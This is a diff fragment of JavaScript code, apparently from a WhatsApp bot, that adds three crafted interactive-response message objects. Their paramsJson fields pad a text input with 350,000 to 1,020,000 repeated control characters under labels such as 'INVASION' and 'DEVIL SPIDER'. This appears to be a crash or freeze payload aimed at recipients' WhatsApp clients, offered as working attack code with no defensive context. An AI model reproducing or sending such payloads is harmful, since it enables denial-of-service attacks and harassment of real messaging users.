+					"nativeFlowResponseMessage": {
+						"name": "galaxy_message",
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"version": 3
+					}
+				}
+			}
+		}
+
+		const VisiX = {
+			key: {
+				remoteJid: 'p',
+				fromMe: false,
+				participant: '0@s.whatsapp.net'
+			},
+			message: {
+				"interactiveResponseMessage": {
+					"body": {
+						"text": "Sent",
+						"format": "DEFAULT"
+					},
+					"nativeFlowResponseMessage": {
+						"name": "galaxy_message",
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐃𝐄𝐕𝐈𝐋 ⿻ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"version": 3
+					}
+				}
+			}
+		}
+
+		const VisiXLoc = {
+			key: {
+				remoteJid: 'p',
+				fromMe: false,
+				participant: '0@s.whatsapp.net'
+			},
+			message: {
+				"interactiveResponseMessage": {
+					"body": {
+						"text": "Sent",
+						"format": "DEFAULT"
+					},
+					"nativeFlowResponseMessage": {
+						"name": "galaxy_message",
+						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@PrelV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐒𝐏𝐈𝐃𝐄𝐑 ⿻ 𝐃𝐄𝐕𝐈𝐋 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+						"version": 3
+					}
+				}
+			}
+		}
+		
 
 //================================================//
 async function crtVid(url) {
